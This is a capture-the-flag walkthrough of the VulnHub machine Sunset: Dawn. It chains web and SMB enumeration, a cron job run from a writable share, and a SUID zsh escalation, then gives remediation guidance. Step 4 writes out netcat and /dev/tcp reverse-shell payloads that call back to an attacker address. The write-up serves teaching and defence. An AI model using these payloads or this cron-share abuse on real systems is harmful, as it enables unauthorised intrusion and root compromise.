# Sunset: Dawn — The Light That Exposes Everything

Alright dude, Sunset: Dawn teaches one of the most underrated attack primitives in infrastructure security: if a cron job runs scripts from a network share you can write to, you own the box. No cap. The attack chain is clean and methodical: web enumeration reveals a log file that exposes the cron job, SMB enumeration finds the writable ITDEPT share, a malicious script upload delivers a reverse shell, and a SUID zsh binary closes the loop to root. Textbook lateral movement meets textbook privesc. Shoutout to whitecr0wz for the clean Sunset series design.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | Sunset: Dawn |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/sunset-dawn,341/ |
| **Techniques** | Host discovery, full port scan, web directory enumeration (dirb), log file analysis, SMB enumeration (enum4linux, smbclient), cron job abuse via writable SMB share, reverse shell upload, SUID binary exploitation (zsh) |
| **CVEs** | No specific CVE: exploits misconfiguration (CWE-732 — Incorrect Permission Assignment; CWE-269 — Improper Privilege Management) |
| **APT Groups** | APT41: documented use of SMB share enumeration and cron-based persistence in enterprise Linux environments; OceanLotus (APT32): uses cron job and scheduled task abuse as primary persistence and lateral movement mechanism on Linux targets |

---

## Attack Summary

```
nmap → HTTP (80), SMB (139/445), MySQL (3306)
  |
  +-> dirb http://192.168.1.165/ → /logs/
  |       |
  |       v
  |   management.log → ITDEPT share scripts executed by cron
  |
  +-> enum4linux → users: dawn, ganimedes
  |
  +-> smbclient //192.168.1.165/ITDEPT → writable, no auth
  |
  +-> upload product-control (nc reverse shell payload)
  |
  +-> wait ~60s for cron execution
  |
  v
shell as user dawn (netcat callback)
  |
  +-> find / -perm -u=s → /usr/bin/zsh (SUID root)
  |
  +-> /usr/bin/zsh → uid=0(root)
  |
  v
/root/flag.txt
```

---

## Methodology

1. Host discovery and full port scan
2. Web enumeration: discover /logs/ directory and management.log
3. Log analysis: identify cron job executing scripts from ITDEPT SMB share
4. SMB enumeration: confirm writable share accessible without credentials
5. Payload creation and upload: malicious script with netcat reverse shell
6. Catch reverse shell when cron fires (approximately every 60 seconds)
7. SUID enumeration: find /usr/bin/zsh with SUID bit set
8. Root access via SUID zsh

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.165

nmap -A 192.168.1.165
```

Open ports:

| Port | Service | Notes |
|---|---|---|
| 80 | HTTP | Apache httpd |
| 139 | NetBIOS-SSN | Samba |
| 445 | SMB | Samba |
| 3306 | MySQL | Possibly accessible |

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and Log Discovery

The web root at port 80 shows an error page or minimal content. Run directory brute-force:

```bash
dirb http://192.168.1.165/

# Or with gobuster for speed:
gobuster dir \
  -u http://192.168.1.165/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,log \
  -t 40
```

Discovery: `/logs/` directory containing `management.log`.

```bash
curl http://192.168.1.165/logs/management.log
```

The log file reveals:
- An ITDEPT SMB share containing two scripts: `product-control` and `web-control`
- These scripts are executed by a cron job approximately every minute

This is the critical intel: a network share whose contents are executed as root on a schedule.

**Real-world note:** Exposed web-accessible log files are a constant finding in internal network assessments. Logs reveal operational details (scheduled jobs, file paths, service names) that directly enable targeted attacks. APT41 is documented to specifically search for web-accessible logs during post-initial-access reconnaissance.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 3 — SMB Enumeration

```bash
# Enumerate shares and users
enum4linux -a 192.168.1.165
```

Users found: `dawn`, `ganimedes`

```bash
# List shares
smbclient -L //192.168.1.165 -N

# Access the ITDEPT share (no credentials required)
smbclient //192.168.1.165/ITDEPT -N
smb: \> ls
# Share is empty but writable
```

Writable SMB share with no authentication. Any file uploaded here will be executed as root by the cron job within ~60 seconds.

**Real-world note:** SMB shares writable without authentication are a critical misconfiguration. In enterprise environments, this pattern is regularly exploited for lateral movement and persistence. OceanLotus (APT32) has used writable SMB shares to stage payloads and maintain persistence across reboots.

**MITRE ATT&CK:** T1021.002 — Remote Services: SMB/Windows Admin Shares; T1135 — Network Share Discovery

---

## Step 4 — Payload Upload and Reverse Shell

Create the malicious scripts matching the expected filenames from the log:

```bash
# Create reverse shell payloads
echo "nc -e /bin/bash 192.168.1.100 4444 &" > product-control
echo "nc -e /bin/bash 192.168.1.100 4445 &" > web-control
```

Upload both to the writable ITDEPT share:

```bash
smbclient //192.168.1.165/ITDEPT -N
smb: \> put product-control
smb: \> put web-control
smb: \> ls
# Verify files are uploaded
smb: \> quit
```

Start the netcat listener before the next cron execution:

```bash
nc -lvnp 4444
```

Wait approximately 60 seconds. The cron job executes the uploaded script and a connection arrives.

**Alternative payload (if nc -e is not available on target):**

```bash
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > product-control
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1053.003 — Scheduled Task: Cron

---

## Step 5 — Shell Stabilization

```bash
# When the reverse shell arrives:
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# On the attacker (Ctrl+Z then):
stty raw -echo; fg
# Press Enter twice
```

Verify identity:

```bash
whoami
# dawn
id
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Privilege Escalation via SUID zsh

Enumerate SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Notable finding: `/usr/bin/zsh` has the SUID bit set and is owned by root.

```bash
/usr/bin/zsh
whoami
# root

cd /root
cat flag.txt
```

(☞ﾟヮﾟ)☞ Root obtained. GG.

**Real-world note:** SUID on interactive shells (bash, zsh, sh, ksh) is an immediate and trivial privilege escalation. SUID means the binary runs as its owner (root) regardless of who executes it. Any interactive shell with SUID root is effectively a `sudo` without password. OceanLotus (APT32) documents SUID binary enumeration as one of the first post-foothold actions on any Linux host.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| SMB anonymous | No credentials required | ITDEPT share | Script upload |
| Users | dawn, ganimedes | enum4linux | Targeting |
| User shell | dawn | Cron reverse shell | Initial foothold |
| Root | uid=0 via SUID zsh | /usr/bin/zsh | Root access |
| Flag | /root/flag.txt | Post-exploitation | Machine complete |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Web-accessible log reveals cron job and SMB share name | Logs expose internal operational details attackers use for targeting | Restrict web server access to logs; use log rotation with access controls |
| 2 | SMB share writable without credentials and executed by cron | This is a complete remote code execution vulnerability: write + execute = RCE | Never execute scripts from network shares as root; require authentication for all SMB shares |
| 3 | SUID bit set on /usr/bin/zsh | Immediate root access with a single command: no exploit required | Audit all SUID binaries regularly; never set SUID on interactive shells |
| 4 | Users discovered via SMB RID cycling (enum4linux) | Username enumeration enables targeted brute-force and password spraying | Disable SMB null session enumeration; restrict anonymous RID cycling |
| 5 | Cron-based execution of user-controlled content | A pervasive pattern: cron executes files that attackers can control | Audit all cron jobs for writable script paths; run cron as least-privileged user |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Reconnaissance | Discovery | Network Share Discovery | T1135 |
| Reconnaissance | Discovery | Account Discovery | T1087 |
| Lateral Movement | Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 |
| Execution | Execution | Scheduled Task: Cron | T1053.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid and Setgid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Restrict SMB share permissions:** ITDEPT must require authentication; remove write access for unauthenticated users
2. **Never execute scripts from network shares as root:** use local scripts owned by root with restricted permissions
3. **Remove SUID from /usr/bin/zsh:** `chmod u-s /usr/bin/zsh`; audit all SUID binaries with `find / -perm -u=s -type f`
4. **Restrict web access to /logs/:** exclude log directories from web root; use `.htaccess` or server config to deny access
5. **Disable SMB null sessions:** prevent anonymous user and share enumeration

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (SMB authentication required; restricted cron scripts)
- **D3-OAM** — Operating System Administrative Management (SUID removal; log access restrictions)
- **D3-NTF** — Network Traffic Filtering (firewall SMB ports; restrict MySQL from untrusted networks)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all SMB shares and their permissions |
| Protect | Access Control | Require authentication for all SMB shares; restrict cron job script sources |
| Protect | Data Security | Remove SUID from interactive shells; restrict /logs/ web access |
| Detect | Anomalies and Events | Alert on anonymous SMB write operations; cron job execution from network paths |
| Respond | Response Planning | Remove malicious scripts from shares; disable anonymous SMB access |
| Recover | Recovery Planning | Audit all cron jobs and scheduled tasks; review all SUID binaries |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | SMB share permissions; web log directory access |
| AC-6 | Least Privilege | Cron jobs run as least-privileged user; remove SUID from shells |
| CM-7 | Least Functionality | Disable anonymous SMB access; restrict web-accessible directories |
| AU-9 | Protection of Audit Information | Restrict web access to log directories |
| SI-2 | Flaw Remediation | Remove SUID from interactive shells; patch SMB misconfigurations |

### CISA KEV

No specific CVE applies here. However, this attack chain maps to multiple CISA guidance documents on SMB misconfiguration (AA20-302A) and Linux privilege escalation via SUID binaries. CISA consistently highlights writable network shares and excessive SUID permissions as critical misconfiguration classes in their advisory catalog.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

Sunset: Dawn is one of those machines where the intended path is straightforward once you connect the dots between the log file and the SMB share. The lesson is real: exposed logs kill operational security. If you can read what the system is doing, you can predict what it will execute next. legit.

Thanks guys!! (❍ᴥ❍ʋ)
